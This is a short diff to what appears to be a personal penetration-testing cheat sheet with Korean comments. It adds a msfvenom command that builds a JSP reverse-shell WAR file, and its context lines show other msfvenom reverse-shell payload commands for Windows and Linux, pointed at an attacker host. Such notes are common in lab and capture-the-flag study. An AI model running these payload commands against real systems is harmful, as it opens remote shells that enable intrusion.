@@ -89,6 +89,8 @@ msfvenom -p windows/shell/reverse_tcp -f c
 # 바이트 타입 명시 필요 없어서 b가 안붙여서 나옴.
 
 msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
 ```
 # nc
 ```powershell
